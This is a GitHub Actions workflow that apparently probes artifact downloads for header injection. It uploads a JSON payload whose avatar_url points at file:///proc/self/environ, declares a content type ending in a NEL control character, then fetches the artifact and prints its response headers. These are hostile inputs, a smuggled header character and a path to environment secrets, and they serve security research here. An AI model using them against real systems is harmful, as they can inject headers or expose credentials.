name: NEL CT Test
on:
  workflow_dispatch:
  push:
    paths:
      - 'trigger.txt'

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Create payload
        run: |
          printf '{"full_name":"RWeng77/rc-test","owner":{"login":"cassette","avatar_url":"file:///proc/self/environ"},"description":"test","stargazers_count":1}' > payload.json
          sha256sum payload.json

      - name: Upload with NEL CT
        uses: ./.github/actions/custom-upload
        env:
          INPUT_NAME: nel-payload
          INPUT_FILE: payload.json
          INPUT_CONTENT-TYPE: "application/json\u0085"

      - name: Check artifact download
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          sleep 5
          ARTIFACTS=$(curl -s -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts")
          echo "=== Artifacts ==="
          echo "$ARTIFACTS" | jq '.artifacts[] | {id, name, size_in_bytes}'

          AID=$(echo "$ARTIFACTS" | jq -r '.artifacts[] | select(.name=="nel-payload") | .id')
          if [ -z "$AID" ] || [ "$AID" = "null" ]; then echo "No artifact"; exit 0; fi
          echo "Artifact ID: $AID"

          REDIR=$(curl -sI -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/actions/artifacts/$AID/zip")
          LOC=$(echo "$REDIR" | grep -i '^location:' | sed 's/^[Ll]ocation: //' | tr -d '\r\n')
          echo "rsct: $(echo "$LOC" | grep -oP 'rsct=[^&]*' || echo 'NO_RSCT')"

          echo "Final CT:"
          curl -sI "$LOC" | grep -i '^content-type'
          echo "CT hex:"
          curl -sI "$LOC" | grep -i '^content-type:' | tr -d '\r\n' | xxd

          echo "Body:"
          curl -s "$LOC" | head -c 200
